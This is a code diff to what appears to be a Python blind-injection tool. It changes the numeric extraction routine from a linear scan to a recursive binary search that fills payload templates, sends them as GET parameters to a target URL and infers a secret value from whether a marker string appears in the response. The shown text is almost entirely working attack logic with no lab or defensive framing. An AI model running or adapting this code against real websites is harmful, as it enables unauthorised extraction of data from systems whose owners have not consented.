@@ -146,6 +146,19 @@ def Get_Time_based(url , header , p):
 
     f1.close()
 
+#Numeric binary search
+def binary_search(start , final, p , sp , s_p , url , user_ch , list , header):
+    mid = (final + start) // 2
+    print("Mid : " , mid)
+    if final < start:
+        return mid
+    pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(mid)).replace("\n", "").replace("{quote}", "<")
+    get = session.get(url=url, headers=header, params=f"{p}={pw}")
+    if sp in get.text:
+        return binary_search(start , mid - 1, p , sp , s_p , url , user_ch , list , header)
+    else:
+        return binary_search(mid + 1 , final, p , sp , s_p , url , user_ch , list , header)
+#Get Numeric
 def Get_Numeric(url , header , p):
     f1 = open("numeric.txt", "r")
     list=[]
@@ -157,20 +170,9 @@ def Get_Numeric(url , header , p):
     user_ch = int(input("your choose : "))
     s_p = input("Sepecial params : ")
     sp = input("Sepecial disappear : ")
-    for i in range(0,100000000000000,1000):
-        pw=list[user_ch].replace("{pw}" , s_p).replace("{i}" , str(i)).replace("\n" , "").replace("{quote}", ">")
-        get = session.get(url = url , headers=header , params=f"{p}={pw}")
-        print(i)
-        if sp not in get.text:
-            print("about : " , i-1000 , i )
-            for j in (i-1000 , i):
-                print(j)                    
-                pw=list[user_ch].replace("{pw}" , s_p).replace("{i}" , str(j)).replace("\n" , "").replace("{quote}", "=")
-                get = session.get(url = url , headers=header , params=f"{p}={pw}") 
-                if sp not in get.text:
-                    print("numeric : " , j-1)
-                    break
+    print("Numeric : " ,binary_search(0,100000000000000000,p, sp , s_p , url ,user_ch,list,  header))
 
 
+        
 
 
